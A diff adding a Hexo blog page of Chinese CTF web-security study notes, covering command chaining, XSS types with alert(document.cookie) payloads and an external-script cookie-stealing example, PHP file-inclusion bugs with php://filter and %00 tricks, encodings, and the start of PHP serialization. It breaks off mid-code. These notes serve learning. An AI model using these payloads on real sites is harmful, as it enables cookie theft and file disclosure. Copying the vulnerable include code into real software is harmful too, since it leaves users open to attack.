@@ -1,0 +1,821 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="clingm"><meta name="copyright" content="clingm"><meta name="generator" content="Hexo 6.0.0"><meta name="theme" content="hexo-theme-yun"><title>CTF-Web-杂记 | Hexo</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.2.4/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="//at.alicdn.com/t/font_1140697_dxory92pb0h.js" async></script><script src="https://cdn.jsdelivr.net/npm/@unocss/runtime/mini.global.js"></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"example.com","root":"/","title":["clingm's","Blog"],"version":"1.8.8","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]},"vendors":{"darken":"https://cdn.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><meta name="description" content="l &amp; 组合命令语法：第一条命令 &amp; 第二条命令 [&amp; 第三条命令…] &amp;、&amp;&amp;、||为组合命令，顾名思义，就是可以把多个命令组合起来当一个命令来执行。这在批处理脚本里是允许的，而且用的非常广泛。因为处理认行不认命令数目。  &amp;这个符号允许在一行中使用 2 个以上不同的命令，当第一个命令执行失败了，也不影响后边的命令执行。这里&amp;两边的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF-Web-杂记">
+<meta property="og:url" content="http://example.com/2022/02/17/CTF-Web-%E6%9D%82%E8%AE%B0-md/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="l &amp; 组合命令语法：第一条命令 &amp; 第二条命令 [&amp; 第三条命令…] &amp;、&amp;&amp;、||为组合命令，顾名思义，就是可以把多个命令组合起来当一个命令来执行。这在批处理脚本里是允许的，而且用的非常广泛。因为处理认行不认命令数目。  &amp;这个符号允许在一行中使用 2 个以上不同的命令，当第一个命令执行失败了，也不影响后边的命令执行。这里&amp;两边的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="c:/Users/崔凌敏/Desktop/西提埃夫/第七周/img/30.png">
+<meta property="article:published_time" content="2022-02-17T08:45:35.000Z">
+<meta property="article:modified_time" content="2022-02-17T08:59:15.037Z">
+<meta property="article:author" content="clingm">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:/Users/崔凌敏/Desktop/西提埃夫/第七周/img/30.png"><script>(function() {
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="clingm"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="clingm"><span class="site-author-status" title="(^_^)">😭</span></a><div class="site-author-name"><a href="/about/">clingm</a></div><span class="site-name">Hexo</span><sub class="site-subtitle"></sub><div class="site-desciption"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">2</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">0</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">0</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#l-amp-%E7%BB%84%E5%90%88%E5%91%BD%E4%BB%A4"><span class="toc-number">1.</span> <span class="toc-text">l &amp; 组合命令</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS"><span class="toc-number">2.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.</span> <span class="toc-text">原理</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://example.com/2022/02/17/CTF-Web-%E6%9D%82%E8%AE%B0-md/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="clingm"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Hexo"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">CTF-Web-杂记</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="创建时间：2022-02-17 16:45:35" itemprop="dateCreated datePublished" datetime="2022-02-17T16:45:35+08:00">2022-02-17</time></div><div class="post-classify"></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h1 id="l-amp-组合命令"><a href="#l-amp-组合命令" class="headerlink" title="l &amp; 组合命令"></a>l &amp; 组合命令</h1><p>语法：第一条命令 &amp; 第二条命令 [&amp; 第三条命令…]</p>
+<p>&amp;、&amp;&amp;、||为组合命令，顾名思义，就是可以把多个命令组合起来当一个命令来执行。这在批处理脚本里是允许的，而且用的非常广泛。因为处理认行不认命令数目。</p>
+<ul>
+<li><p>&amp;这个符号允许在一行中使用 2 个以上不同的命令，当第一个命令执行失败了，也不影响后边的命令执行。这里&amp;两边的命令是顺序执行的，从前往后执行。</p>
+</li>
+<li><p>Command 1 | Command 2</p>
+</li>
+</ul>
+<p>“|”是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。</p>
+<ul>
+<li>; 分号</li>
+</ul>
+<p>分号，当命令相同时，可以将不同目标用；来隔离，但执行效果不变，如执行过程中发生错误，则只返回错误报告，但程序仍会执行</p>
+<hr>
+<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>XSS（跨站脚本攻击）</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>XSS攻击实在网页中嵌入客户端恶意脚本代码，这些恶意代码一般</p>
+<p>xss产生的原因主要是对html标签审查不严格造成的，这些恶意代码一般是使用JavaScript语言编写的(也有使用ActionSctipt, VBscript). 所以想深入研究XSS，必须要精通JavaScript。</p>
+<p>JavaScript可以用来获取用户的cookie、黑掉页面、导航到恶意网站，攻击者需要做的就是向Web页面中注入JavaScript代码</p>
+<p>下面是一个最简单的XSS漏洞实例</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;PrintStr&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>PrintStr 页面如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">   String name = requeset.getParameter(&quot;username&quot;);</span><br><span class="line">   out.println(&quot;您输入的内容是：&quot; + name);</span><br><span class="line">   %&gt;</span><br></pre></td></tr></table></figure>
+
+<p>攻击者可以输入<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>触发XSS攻击。即在<script>标签中输入JavaScript代码，实现特殊效果。真实的攻击中，通常使用</p>
+<p><code>&lt;script src=&quot;http//:www.secbug.org/x.txt&quot;&gt;&lt;/script&gt;</code> 方式加载外部脚本，x.txt中就存放着攻击者的恶意JavaScript代码，这段代码可能是用来盗取用户的cookie，也可能是监控键盘记录等恶意行为。</p>
+<h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>也称为非持久型XSS，是现在最容易出现的一种XSS漏洞。</p>
+<p>当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成XSS漏洞。这个过程就像一次反射，故称为反射型XSS。</p>
+<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>下面是一个XSS的例子：</p>
+<p>假如<a target="_blank" rel="noopener" href="http://www.secbug.org/xss.php">http://www.secbug.org/xss.php</a> 存在XSS反射跨站漏洞,那么攻击者的步骤可能如下。</p>
+<p>①用户HIM是网站<a target="_blank" rel="noopener" href="http://www.secbug.org/">www.secbug.org</a> 的忠实粉丝,此时正泡在论坛看信息。<br>②攻击者发现<a target="_blank" rel="noopener" href="http://www.secbug.org/xss.php">www.secbug.org/xss.php</a> 存在反射型XSS漏洞,然后精心构造 JavaScript 代码,此段代码可以盗取用户Cookie发送到指定的站点<a target="_blank" rel="noopener" href="http://www.xxser.com/">www.xxser.com</a>.<br>③攻击者将带有反射型XSS漏洞的URL通过站内信发送给用户HIM，站内信为一些诱惑信息，目的是为让用户HIM单击链接。<br>④假设用户HIM单击了带有XSS漏洞的URL，那么将会把自己的Cookie发送到网站<a target="_blank" rel="noopener" href="http://www.xxser.com./">www.xxser.com。</a></p>
+<p>⑤攻击者接收到用户HIM的会话Cookie，可以直接利用Cookie以HIM的身份登录<a target="_blank" rel="noopener" href="http://www.secbug.org/">www.secbug.org</a>, 从而获取用户HIM的敏感信息。</p>
+<p>- </p>
+<h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><p>存储型XSS又被称为持久性XSS，存储型XSS是最危险的一种跨站脚本。</p>
+<pre><code>**允许用户存储数据的Web应用程序**都可能会出现存储型XSS漏洞，当攻击者提交一段xSS代码后，被服务器端接收并存储，当攻击者再次访问某个页面时，这段XSS代码被程序读出来响应给浏览器，造成XSS跨站攻击，这就是存储型XSS。
+存储型XSS与反射型XSS、DOM型XSS相比，具有更高的隐蔽性，危害性也更大。它们之间最大的区别在于**反射型XSS与DOM型XSS执行都必须依靠用户手动去触发**，而存储型XSS却不需要。
+
+攻击者将带有XSS代码的留言提交到数据库，当用户查看这段留言时，浏览器会把XSS代码认为是正常的 JavaScript 代码来执行。所以，存储型XSS具有更高的隐蔽性。
+</code></pre>
+<h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a><strong>DOM型</strong></h3><h5 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h5><p>对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问它们了</p>
+<h6 id="document对象"><a href="#document对象" class="headerlink" title="document对象"></a>document对象</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">document.body  #提供对<span class="tag">&lt;<span class="name">body</span>&gt;</span>元素的直接访问，对于定义了框架集的文档，该属性引用最外层的<span class="tag">&lt;<span class="name">frameset</span>&gt;</span></span><br><span class="line">document.cookie  #设置或返回与当前文档有关的所有cookie</span><br><span class="line">document.domain  #返回当前文档的域名</span><br><span class="line">document.lastModified  #返回文档被最后修改的日期和时间，可以分辨静态页面、伪静态页面、动态页面</span><br><span class="line">document.referrer  #返回链接到当前文档的源页面的URL</span><br><span class="line">document.title  #返回当前文档的标题</span><br><span class="line">document.URL  #返回当前文档的URL</span><br></pre></td></tr></table></figure>
+
+<h6 id="document对象方法"><a href="#document对象方法" class="headerlink" title="document对象方法"></a>document对象方法</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">document.open()  #打开一个流，以收集来自任何document.write()或document.writeln()方法的输出</span><br><span class="line">document.close()  #关闭使用document.open()方法打开的输出流，并显示选定的数据</span><br><span class="line">document.getElementById()  #返回对拥有指定ID的第一个对象的引用</span><br><span class="line">document.getElementsByName()  #返回带有指定名称的对象集合</span><br><span class="line">document.getElementsByTagName()  #返回带有指定标签名的对象集合</span><br><span class="line">document.write()  #像文档写HTML表达式或JavaScript代码，可以接受native编码值</span><br><span class="line">document.writeln()  #等同于document.write()方法，不同的是在每个表达式之后写一个换行符</span><br></pre></td></tr></table></figure>
+
+<p><em><strong>如果innerHTM需要触发XSS，不能够使用标签型，需要使用事件型</strong></em></p>
+<p><code>&lt;img src=1 onerror=alert(document.cookie)&gt;</code></p>
+<h3 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h3><pre><code>在测试是否存在XSS时，首先要确定输入点与输出点。
+
+如果输出的数据在属性内，那么XSS代码是不会被执行的。如：
+</code></pre>
+<p><code>&lt;input type=&quot;text&quot;name=&quot;content&quot;value=&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;/&gt;</code><br>以上 JavaScript 代码虽然成功地插入到了HTML中，但却无法执行，因为XSS代码出现在Value属性中，被当作值来处理，最终浏览器解析HTML时，将会把数据以文本的形式输出在网页中。</p>
+<p>下面米看看具体的存储型XSS漏洞，测试步骤如下:</p>
+<p>①添加正常的留言，昵称为“Xxser”，留言内容为“ HelloWorld ”，使用Firebug快速寻找显示标签，发现标签为：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>Xxer<span class="tag">&lt;/<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;message&quot;</span>&gt;</span>HelloWorld<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;time&quot;</span>&gt;</span>2021-11-20 15:06<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>②如果显示区域不在HTML属性内，则可以直接使用XSS代码注入。如果说不能得知内容输出的具体位置，则可以使用模糊测试方案，XSS代码如下。</p>
+<ul>
+<li><p><code>＜script＞alert（document.　cookie）＜／script＞</code>普通注入；</p>
+</li>
+<li><p><code>＂／＞＜script＞alert（document.　cookie）＜／script＞</code>：闭合标签注入；</p>
+</li>
+<li><p><code>&lt;/textarea&gt;&quot;&quot;&gt;&lt;script&gt;alert(document.　cookie)&lt;/script&gt;</code>：闭合标签注入。</p>
+</li>
+</ul>
+<h3 id="常见的playload"><a href="#常见的playload" class="headerlink" title="常见的playload"></a>常见的playload</h3><p>  <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
+<p>  <code>&lt;body onload=alert(document.cookie)&gt;</code></p>
+<p>  <code>&lt;img src=&quot;&quot; onerror=alert(document.cookie)&gt;</code></p>
+<p>  <code>&lt;a href=&#39;&#39; onclick=alert(document.cookie)&gt;click&lt;/a&gt;</code></p>
+<p>  <code>&lt;a href=&#39;&#39; onclick=alert(document.cookie)&gt;click&lt;/a&gt;</code></p>
+<hr>
+<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>为了更好地使用代码的重用性，可以使用文件包含函数将文件包含进来，直接使用文件中的代码来提高重用性。但是这也产生了<strong>文件包含漏洞</strong>，产生原因是在通过 PHP 的函数引入文件时，为了灵活包含文件会将被包含文件设置为变量，通过动态变量来引入需要包含的文件。此时用户可以对变量的值可控，而服务器端未对变量值进行合理地校验或者校验被绕过，就会导致文件包含漏洞。</p>
+<blockquote>
+<p>文件包含函数</p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>include()</td>
+<td>代码执行到 include() 函数时将文件包含</td>
+</tr>
+<tr>
+<td>include_once()</td>
+<td>当重复调用同一文件时只调用一次,功能与 include() 相同</td>
+</tr>
+<tr>
+<td>require()</td>
+<td>require() 执行如果发生错误，函数会报错并终止脚本</td>
+</tr>
+<tr>
+<td>require_once()</td>
+<td>当重复调用同一文件时只调用一次,功能与 require() 相同</td>
+</tr>
+</tbody></table>
+</blockquote>
+<h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><p>当包含的文件在服务器本地时，就形成了本地文件包含。文件包含可以包含任意文件，被包含的文件可以不是 PHP 代码，可以是文本或图片等。只要文件被包含就会被服务器脚本语言执行，如果包含的文件内容不符合 php 语法，会直接将文件内容输出。</p>
+<p>该文件可以是任何类型，无论它是被删除的文件类型、图片还是任意的内容，都包括在内。</p>
+<p>简单的php代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><p>当包含的文件在远程服务器上时，就形成了远程文件包含。有两个要点：</p>
+<blockquote>
+<p>allow_url_include = on（是否允许 include/require 远程文件）<br>allow_url_fopen = on（是否允许打开远程文件</p>
+</blockquote>
+<blockquote>
+<p>所包含远程服务器的文件后缀不能与目标服务器语言相同</p>
+</blockquote>
+<p>第二点的解释：如果你的远程文件具有.php后缀，并且你的远程文件内容如下所示：</p>
+<p><code>&lt;? php phpinfo ();?&gt;</code></p>
+<p>那么在远程服务器执行phpinfo()之后，你就可以获得目标服务器的内容。但由于它不会运行代码，所以包含的信息不是目标服务器，而是远程服务器。</p>
+<p>由于目标服务器不包含此代码：<code>&lt;? php phpinfo ();?&gt;</code>此时，远程服务器会执行此代码的源代码</p>
+<hr>
+<h4 id="当php代码对包含的文件有限制时的技巧"><a href="#当php代码对包含的文件有限制时的技巧" class="headerlink" title="当php代码对包含的文件有限制时的技巧"></a>当php代码对包含的文件有限制时的技巧</h4><p>如下代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    Include  <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>].<span class="string">&quot;.php&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>限制包含的文件后缀是php。可以用空字符<code>%00</code>截断。</p>
+<p>原理：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于 PHP 使用底层 c 函数进行与文件系统相关的操作，它可能以一种非常意想不到的方式处理空字节。由于 null 字节表示 c 语言中字符串的结束，因此不会完全考虑包含它们的字符串，而只是在出现 null 字节之前考虑。(php官网翻译来的（权威）)</span><br></pre></td></tr></table></figure>
+
+<h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p><strong>PHP 伪协议</strong>是 PHP 支持的协议与封装协议，几个 PHP 支持的伪协议如下。</p>
+<table>
+<thead>
+<tr>
+<th>伪协议</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>file:&#x2F;&#x2F;</td>
+<td>访问本地文件系统</td>
+</tr>
+<tr>
+<td>http:&#x2F;&#x2F;</td>
+<td>访问 HTTP(s) 网址</td>
+</tr>
+<tr>
+<td>php:&#x2F;&#x2F;</td>
+<td>访问各个输入&#x2F;输出流</td>
+</tr>
+<tr>
+<td>phar:&#x2F;&#x2F;</td>
+<td>PHP 归档</td>
+</tr>
+<tr>
+<td>zip:&#x2F;&#x2F;</td>
+<td>压缩流</td>
+</tr>
+<tr>
+<td>例如在 allow_url_include &#x3D; on 时服务器上有个文件叫 index.php，且存在文件包含漏洞，这个时候就能用 php 伪协议直接把文件显示出来。</td>
+<td></td>
+</tr>
+</tbody></table>
+<p><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code></p>
+<p><strong>php://filter/</strong> 是一种访问本地文件的协议，/read=convert.base64-encode/ 表示读取的方式是 base64 编码后，resource=index.php 表示目标文件为index.php。问什么要进行 base64 编码呢？如果不进行 base64 编码传入，index.php 就会直接执行，我们就看不到文件中的内容了。php 协议还常用 <strong>php://input</strong>，这可以访问请求的原始数据的只读流，可以读取 POST 请求的参数。</p>
+<h3 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data 伪协议"></a>data 伪协议</h3><p>php 5.2.0 起，数据流封装器开始有效，主要用于数据流的读取，如果传入的数据是PHP代码就会执行代码。使用方法为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain;base64,xxxx(base64编码后的数据)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="CTF常见的编码"><a href="#CTF常见的编码" class="headerlink" title="CTF常见的编码"></a>CTF常见的编码</h1><h3 id="ASCII编码"><a href="#ASCII编码" class="headerlink" title="ASCII编码"></a>ASCII编码</h3><p> <strong>简述 ：</strong></p>
+<p>ASCII 码是对<strong>英语字符与二进制位之间</strong>的关系，做了统一规定。</p>
+<p>基本的 ASCII 字符集共有 128 个字符，其中有 96 个可打印字符，包括常用的字母、数字、标点符号等，</p>
+<p> 如：空格SPACE 是32（二进制：00100000）；</p>
+<p> 数字0 是48(二进制：00110000)；</p>
+<p> 大写字母A 是65（二进制：01000001）。</p>
+<p>另外还有 32 个控制字符（不能打印出来）。</p>
+<p>这128个符号，只占用了一个字节的后面7位，最前面的一位统一规定为0。</p>
+<p> <strong>特征：</strong> <strong>只含有数字</strong></p>
+<ul>
+<li>0-9, 49-57</li>
+<li>A-Z, 65-90</li>
+<li>a-z, 97-122</li>
+</ul>
+<h3 id="base家族编码"><a href="#base家族编码" class="headerlink" title="base家族编码"></a>base家族编码</h3><blockquote>
+<p>base16 / base32 / base64 / base58 / base85 / base 100</p>
+</blockquote>
+<p> <strong>简述：</strong></p>
+<p>**Base16编码是将二进制文件转换成由16个字符组成的文本 **</p>
+<p><strong>base32的编码表是由（A-Z、2-7）32个可见字符构成，“=”符号用作后缀填充。</strong></p>
+<p><strong>base64的编码表是由（A-Z、a-z、0-9、+、/）64个可见字符构成，“=”符号用作后缀填充。</strong></p>
+<p><strong>base58的编码表相比base64少了数字0，大写字母I，O，小写字母 l (这个是L），以及符号‘+’和‘/’</strong></p>
+<p><strong>base91的密文由91个字符（0-9，a-z，A-Z,!#$%&()*+,./:;<=>?@[]^_`{|}~”）组成</strong></p>
+<p>**Base100编码/解码工具（又名：Emoji表情符号编码/解码），可将文本内容编码为Emoji表情符号；同时也可以将编码后的Emoji表情符号内容解码为文本。 **</p>
+<p><strong>特征：末尾可能有=号</strong></p>
+<h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><p> <strong>简述：</strong></p>
+<p> 一般MD5值是32位由数字“0-9”和字母“a-f”所组成的字符串，字母大小写统一；如果出现这个范围以外的字符说明这可能是个错误的md5值，就没必要再拿去解密了。</p>
+<p> 16位值是取的是8~24位。</p>
+<p> <strong>特征：</strong></p>
+<p> 有固定长度，一般是32位或者16位</p>
+<p> 由数字“0-9”和字母“a-f”组成大小写统一</p>
+<hr>
+<h1 id="PHP序列化与反序列化"><a href="#PHP序列化与反序列化" class="headerlink" title="PHP序列化与反序列化"></a>PHP序列化与反序列化</h1><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">类 ：对现实生活中一类具有共同特征的事物的抽象</span><br><span class="line">对象：所说的事物</span><br><span class="line">属性：类中对象所具有的性质</span><br><span class="line">方法：可以用来操作该对象或者该对象可以使用那些方法</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">class_test</span></span>&#123;</span><br><span class="line">    	<span class="keyword">var</span> <span class="variable">$a</span>;  <span class="comment">//a 是属性</span></span><br><span class="line">    </span><br><span class="line">    	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">echo_var</span>(<span class="params"></span>)</span>&#123;  <span class="comment">//方法，也就是函数</span></span><br><span class="line">        	<span class="keyword">echo</span> <span class="string">&quot;this is a&quot;</span> . <span class="variable language_">$this</span>-&gt;<span class="variable">$a</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">class_test</span>(); <span class="comment">//创建一个对象</span></span><br><span class="line">	<span class="variable">$test</span>-&gt;a = <span class="string">&quot;first&quot;</span>;  <span 